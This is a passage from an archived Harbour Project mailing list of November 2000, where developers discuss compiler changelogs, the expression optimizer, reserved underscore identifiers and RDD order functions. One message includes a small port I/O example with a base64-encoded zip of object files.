expression optimizer to be fully CA-Clipper compatible.

Here comes to mind that some compile time function call optimizations 
are still missing from Harbour.

Victor Szakats



</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 12:32:06 2000
Date: Wed Nov  8 12:32:06 2000
From: Dave Pearson harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-04 13:35 UTC+0100

<PRE>On Wed, Nov 08, 2000 at 05:29:30PM +0100, Victor Szakats wrote:
&gt;<i> Dave,
</I>&gt;<i> 
</I>&gt;<i> 
</I>&gt;<i> &gt; &gt; I wonder where this behaviour is documented. 
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt; Guide to CA-Clipper&gt;&gt;Tables&gt;&gt;Reserved Words.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; It isn't a bug and it is documented. To quote from the above pointer:
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt; ,----[ CA-Clipper&gt;&gt;Tables&gt;&gt;Reserved Words ]
</I>&gt;<i> &gt; |  o  All identifiers that begin with one or more underscore characters
</I>&gt;<i> &gt; |     (_) are designated as system identifiers and are therefore reserved.
</I>&gt;<i> &gt; `----
</I>&gt;<i> 
</I>&gt;<i> I meant a rule specifically for the GETs, I know about the general rule
</I>&gt;<i> not to use symbols beginning with &quot;_&quot;.
</I>
The above rule does speak about GETs because it talks about identifiers and,
if I'm to understand the problem, you can't GET a variable whose name is _1.
The above rule says that you shouldn't be using such an variable name in the
first place, failure to do so will result in all sorts of horrible carnage
(bad compile, end of the world, forced to learn VB (in order of best case to
worst case)).

&gt;<i> Considering all this, if we can implement the same thing without this
</I>&gt;<i> limitation, that could not hurt anyone.
</I>
Agreed, there's no harm in removing the use of _1 as a system identifier in
this case but there's also no harm in harbour using anything that starts
with an underscore either.

Personally I vote that the compiler, upon seeing an identifier that starts
with an underscore, issues an FERASE on *.prg. Now *that's* code
optimisation. ;&gt;

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: <A HREF="http://www.harbour-project.org/">http://www.harbour-project.org/</A>
FAQ................: <A HREF="http://www.harbour-project.org/faq/harbour.html">http://www.harbour-project.org/faq/harbour.html</A>
My harbour page....: <A HREF="http://www.hagbard.demon.co.uk/harbour/">http://www.hagbard.demon.co.uk/harbour/</A>

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 12:34:01 2000
Date: Wed Nov  8 12:34:01 2000
From: rglab harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-08 18:25 UTC+0100

<PRE>    *source/vm/macro.c
        *fixed support for field variables in TYPE() function
        
    *tests/dbevalts.prg
    *tests/newrdd.prg
    *tests/testbrdb.prg
    *tests/testlbl.prg
    *tests/testrpt.prg
    *tests/tstalias.prg
    *tests/tstdbi.prg
        *All file names should be written in lower case
        NOTE: newrdd.prg still creates file in upper case since it is
        hardcoded somwhere in the RDD code

Regards, Ryszard

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 12:37:03 2000
Date: Wed Nov  8 12:37:03 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] _GET_, _1 and optimisers

<PRE>Ron,

&quot;Harbour _already_ has an Expression Optimizer ... impressive
subsystem&quot;

Gulp.

Is there an easy way to disable it in case I hit something odd?

Actually, recent builds have changed in some way I haven't yet
figured out and none of my OOP stuff works any more - so the above
isn't an urgent issue!

John.

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 12:37:15 2000
Date: Wed Nov  8 12:37:15 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] STATIC array problem

<PRE>[To All]

This:

function main()
static	a[7]	// this is line 3
return 0

Now fails (but has always worked before now):

Harbour Compiler 0.35i (Build 35) (2000.10.23)
Copyright 1999-2000, <A HREF="http://www.harbour-project.org">http://www.harbour-project.org</A>
Compiling 'T9.PRG'...
T9.PRG(3) Error E0030  Syntax error: &quot;parse error at '&lt;eol&gt;'&quot;
1 error

John.

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 13:16:03 2000
Date: Wed Nov  8 13:16:03 2000
From: rglab harbour@lists.harbour-project.org
Subject: [Harbour] _GET_, _1 and optimisers

<PRE>John Skelton wrote:

&gt;<i> Is there an easy way to disable it in case I hit something odd?
</I>
  The expression optimizer works as a middleware between the syntax
analyzer (bison) and pcode generation so it is not possible to disable
it. Although we can add some switch to disable the expression reduction
phase - so (1+2) will be passed without change instead of replacing it
with 3.
However is there really a need for it?

Regards, Ryszard

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 13:24:02 2000
Date: Wed Nov  8 13:24:02 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-04 13:35 UTC+0100

<PRE>[To Dave Pearson]

&quot;Personally I vote that the compiler, upon seeing an identifier that star=
ts
with an underscore, issues an FERASE on *.prg. Now *that's* code
optimisation. ;&gt;&quot;

OK, a joke - but please take some pity on 3P's who can have needs
quite similar to those Clipper itself has.  You probably know what
I mean, so ignore the rest - it's just for anyone in doubt. :-)

I didn't want to use &quot;_&quot; names, but no better alternatives were
obvious.  Plus, I was in a big hurry and only expected about 9 months
of sales before the new Aspen (VO) would be out.  I cut corners, and
I took a chance that the names I used would later have to change if
Clipper/Aspen used them.  I did try to pick names that I thought were
unlikely to clash, and I 100% knew it was my problem if such a clash
occurred at some future point.

I even renamed some well-known Windows things (*) so that I could
expect my names to be different to the ones Aspen would use, and I
could map mine onto Aspen's.

(*) basically things I thought users would not really need to use
or think about much e.g. I made _GetInstance(), with an internal C
public variable name __hInstance.

Such things are now quite hard to change, given the number of C4W
users - who sure wouldn't want to go round making changes which I
think they'd see as pointless (at best).  Mea culpa etc. :-(

So, please forgive 3P's. :-)

Oh yes, and no name has ever clashed. :-) :-)

John.

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 13:24:13 2000
Date: Wed Nov  8 13:24:13 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] _GET_, _1 and optimisers

<PRE>Victor,

&quot;we do need an expression optimizer to be fully CA-Clipper compatible&quot;

A compile-time one, certainly.  Especially for things like
IF .F. ... ENDIF

If it works, great!

John.

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 13:26:02 2000
Date: Wed Nov  8 13:26:02 2000
From: Felipe G. Coury harbour@lists.harbour-project.org
Subject: [Harbour] _GET_, _1 and optimisers

<PRE>Ryszard,

[about the switch that will turn off expression optimizer]
&gt;<i> However is there really a need for it?
</I>Learning purposes maybe?

Regards,

Felipe G. Coury
Gerente de Desenvolvimento
Creation Internet Business
<A HREF="http://www.creation.com.br">http://www.creation.com.br</A>

--------------------------------------------
Visite o GuiaBrasil.Net:
<A HREF="http://www.guiabrasil.net">http://www.guiabrasil.net</A>
--------------------------------------------



</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 13:27:02 2000
Date: Wed Nov  8 13:27:02 2000
From: Victor Szakats harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-04 13:35 UTC+0100

<PRE>&gt;<i> Personally I vote that the compiler, upon seeing an identifier that starts
</I>&gt;<i> with an underscore, issues an FERASE on *.prg. Now *that's* code
</I>&gt;<i> optimisation. ;&gt;
</I>
;)

Victor Szakats



</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 13:48:02 2000
Date: Wed Nov  8 13:48:02 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-08 18:25 UTC+0100

<PRE>Thanks, Ryszard!
I now have 50% of a large FWH app running well...

Brian Hays

&gt;<i>     *source/vm/macro.c
</I>&gt;<i>         *fixed support for field variables in TYPE() function
</I>&gt;<i>         
</I>


</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 14:05:04 2000
Date: Wed Nov  8 14:05:04 2000
From: David G. Holm harbour@lists.harbour-project.org
Subject: [Harbour] Konvert little program

<PRE>** Reply to message from Ignacio_Ortiz_de_Zu=F1iga &lt;<A HREF="mailto:ignacio@fivetech.com">ignacio@fivetech.com</A>&gt;
on Wed, 8 Nov 2000 14:10:15 +0100

&gt;<i> It will be great if we can have BEGIN C CODE, END C CODE statements so we
</I>&gt;<i> can create C &amp; assembler functions on the fly.
</I>
It would be an incredible waste of time, talent, and effort to
implement such an extension to Harbour, when all that is needed to use
C or Assembler with Harbour is to use the Harbour C API and link in the
extra functions.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 14:33:01 2000
Date: Wed Nov  8 14:33:01 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] CHANGELOG: 2000-11-08 11:28 UTC+0800

<PRE>2000-11-08 11:28 UTC+0800 Brian Hays &lt;<A HREF="mailto:bhays@abacuslaw.com">bhays@abacuslaw.com</A>&gt;
   * source\vm\arrays.c
      * added Victor's fix for passing the second parameter to ascan's
codeblock.

   * contrib/rdd_ads/ads1.c
      * fixed adsSetScope -- SET SCOPE was busted
      * adsOrderInfo
         +added support for
         DBOI_ORDERCOUNT
         DBOI_KEYCOUNT
         DBOI_CUSTOM
         DBOI_POSITION  &lt;&lt; changed DBOI_RECNO to this!

   * include/hbapirdd.h
      TEMPORARILY added extra 5.3 DBOI_* constants
   * contrib/rdd_ads/adsfunc.c
      * minor editing
   * source/rtl/dummy.prg
   * source/rdd/dbcmd.c
      * moved dbOrderInfo from dummy.prg to dbcmd.c
      * fixed ordScope parameter checking
   * source/rdd/workarea.c
      * added commented-out OrderInfo; waiting for agreement on how to
implement it


Brian Hays
Abacus Data Systems, Inc



</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 14:51:02 2000
Date: Wed Nov  8 14:51:02 2000
From: Antonio Linares harbour@lists.harbour-project.org
Subject: [Harbour] Konvert little program

<PRE>This is a multi-part message in MIME format.

------=_NextPart_000_000D_01C049C5.4BB7DE20
Content-Type: text/plain;
	charset=&quot;iso-8859-1&quot;
Content-Transfer-Encoding: 7bit

Hadi,

Its really easy. This PRG works both with Clipper
and Harbour. 

Functions OutPortByte(), InPortByte() and nAnd()
are from the FiveWin library. I send you the OBJs
for both 16 and 32 bits you may link with your app.

Please let me know if it works for you.

// Clipper or Harbour and FW ports management funtions

#define ALA 772  // 0x304

function Main()

   local _int, ints

   OutPortByte( ALA, 129 )  // 0x81
   OutPortByte( ALA, 137 )  // 0x89
   OutPortByte( ALA, 129 ) // 0x81

   _int = InPortByte( ALA + 1 )
   _int = nAnd( _int, 1 )

   if _int &lt;&gt; 0
      ints = 1
   else
      ints = 0
   endif

return nil


Antonio Linares
<A HREF="http://www.fivetech.com">http://www.fivetech.com</A>
------=_NextPart_000_000D_01C049C5.4BB7DE20
Content-Type: application/x-zip-compressed;
	name=&quot;inout.zip&quot;
Content-Transfer-Encoding: base64
Content-Disposition: attachment;
	filename=&quot;inout.zip&quot;

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
AAApEQAAAAA=

------=_NextPart_000_000D_01C049C5.4BB7DE20--


</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 15:49:02 2000
Date: Wed Nov  8 15:49:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-04 13:35 UTC+0100

<PRE>Victor, Ryszard,

Why should such an extension be conditional? It is not compromising any
compatibility, does it?  Don't we have many other unconditional extensions
already?

It already has an HB_ name space prefix, I think we should include all such
extensions by default.

Ron

&gt;<i> Ryszard,
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> &gt; I have tested it and it works correctly. However we need to remove #if
</I>&gt;<i> &gt; HB_EXTENSION from rtl/pvalue.c
</I>&gt;<i>
</I>&gt;<i> Or we could add an internal version of the same function, like:
</I>&gt;<i> __PVALUE(), which could be there all the time.
</I>&gt;<i>
</I>&gt;<i> Victor Szakats
</I>

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 16:53:02 2000
Date: Wed Nov  8 16:53:02 2000
From: Antonio Linares harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-08 15:40 UTC+0100

<PRE>Ryszard,

Thanks so much for such important contribution!!!

&gt;<i>         * fixed the order of memory deallocations done in the garbage
</I>&gt;<i>           collector (this will fix many random core dumps/GPF's)
</I>&gt;<i>         * removed unnecessary reference counter inc/dec operations       
</I>

Antonio



</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 17:09:02 2000
Date: Wed Nov  8 17:09:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] STATIC array problem

<PRE>2000-11-08 24:10 UTC+0800 Ron Pinkas &lt;<A HREF="mailto:ron@profit-master.com">ron@profit-master.com</A>&gt;
   * source/compiler/cmdcheck.c
   * utils/hbpp/hbpp.c
     + Added missing type case for C++ compilers.

   * source/compiler/simplex.c
     * Added 1 missing var reset.

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 17:10:04 2000
Date: Wed Nov  8 17:10:04 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] dbOrderInfo and dbcmd.c

<PRE>I need help with some code structuring decisions.
dbOrderInfo was a 5.3 function, at least on the documented Clipper-code
level.
It &quot;duplicates&quot; the functionality of many other functions, as well as adds
many more.
There are, for example at least 3 ways to get an index's key: IndexKey(),
ordKey(), and dbOrderInfo().

Obviously it would be best if all 3 call the same low-level code.  Either
dbOrderInfo should be the source of all the info, and the others are
wrappers for it (makes sense to me), or dbOrderInfo should be a high-level
dispatcher to the specific functions which then call SELF_ORDINFO.

I believe the evolution of Clipper (and good design) leads toward the first
choice, but it makes the other functions dependent upon it EVEN IN 5.2 MODE,
so it could not be reserved for 5.3 compatibility.  Since the vast majority
of expressed opinions said a 5.3 compatibility level for Harbour was
preferred (with an effort to not pollute 5.2 namespace issues), I'd like to
make dbOrderInfo available to all builds as the tool of choice for order
management, as a C function.  I think the code currently residing in dbcmd.c
for ordKey() and ordKeyNo() and others should be moved into this new
function, and those should become wrappers in rddord.prg as IndexKey() is
now.

Believe me, no one hates un-doing working code more than I, but it just
doesn't make sense for the parameter checking, setup and calls to
SELF_ORDINFO to be happening in two places.

Also, Ryszard suggested breaking up dbcmd.c; perhaps now is the time?
Although if all the ord* functions move to rddord.prg there will be a lot
fewer funcs there.

Opinions, please...

Brian Hays



</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 17:13:03 2000
Date: Wed Nov  8 17:13:03 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] STATIC array problem

<PRE>John,

Fixed. Sorry I missed 1 var reset.

Ron

&gt;<i> [To All]
</I>&gt;<i> 
</I>&gt;<i> This:
</I>&gt;<i> 
</I>&gt;<i> function main()
</I>&gt;<i> static	a[7]	// this is line 3
</I>&gt;<i> return 0
</I>&gt;<i> 
</I>&gt;<i> Now fails (but has always worked before now):
</I>&gt;<i> 
</I>&gt;<i> Harbour Compiler 0.35i (Build 35) (2000.10.23)
</I>&gt;<i> Copyright 1999-2000, <A HREF="http://www.harbour-project.org">http://www.harbour-project.org</A>
</I>&gt;<i> Compiling 'T9.PRG'...
</I>&gt;<i> T9.PRG(3) Error E0030  Syntax error: &quot;parse error at '&lt;eol&gt;'&quot;
</I>&gt;<i> 1 error
</I>&gt;<i> 
</I>&gt;<i> John.
</I>

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 17:44:24 2000
Date: Wed Nov  8 17:44:24 2000
From: Dave Pearson harbour@lists.harbour-project.org
Subject: [Harbour] Konvert little program

<PRE>On Wed, Nov 08, 2000 at 01:58:18PM -0500, David G. Holm wrote:
&gt;<i> ** Reply to message from Ignacio_Ortiz_de_Zuñiga &lt;<A HREF="mailto:ignacio@fivetech.com">ignacio@fivetech.com</A>&gt;
</I>&gt;<i> on Wed, 8 Nov 2000 14:10:15 +0100
</I>&gt;<i> 
</I>&gt;<i> &gt; It will be great if we can have BEGIN C CODE, END C CODE statements so we
</I>&gt;<i> &gt; can create C &amp; assembler functions on the fly.
</I>&gt;<i> 
</I>&gt;<i> It would be an incredible waste of time, talent, and effort to implement
</I>&gt;<i> such an extension to Harbour, when all that is needed to use C or
</I>&gt;<i> Assembler with Harbour is to use the Harbour C API and link in the extra
</I>&gt;<i> functions.
</I>
*Applause*

. o O ( Modulo the fact that, if someone feels the need to hack, hack... )

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: <A HREF="http://www.harbour-project.org/">http://www.harbour-project.org/</A>
FAQ................: <A HREF="http://www.harbour-project.org/faq/harbour.html">http://www.harbour-project.org/faq/harbour.html</A>
My harbour page....: <A HREF="http://www.hagbard.demon.co.uk/harbour/">http://www.hagbard.demon.co.uk/harbour/</A>

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 18:00:05 2000
Date: Wed Nov  8 18:00:05 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] COPY TO

<PRE>Harrier:
I tried the new rddcpy.c that you sent to the list, and it still has an
error here whether or not I use ADS:
Open Error on the target file.

Brian Hays



</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 18:53:02 2000
Date: Wed Nov  8 18:53:02 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] strtoken behavior

<PRE>In contrib\libmisc there's a strtoken function very similar to the one in
FW.

It has an explicit section that skips over a leading delimiter.  To me, this
seems wrong as the first token from &quot;1,2,3,&quot; should be &quot;1&quot;, but the first
token from &quot;,2,3,&quot; should be an empty string, NOT &quot;2&quot; as the current code
returns.
By skipping a leading delimiter, it defeats any 2-way logic that might store
empty vars to a position.

Am I all wet (not far from California...) ?
Would anyone really want a delimited list that ignores a leading delimiter
to find the &quot;first&quot; token in the second slot?  Should I change it?   (Notice
that if the delimiter is a space, it will skip over _all_ leading space,
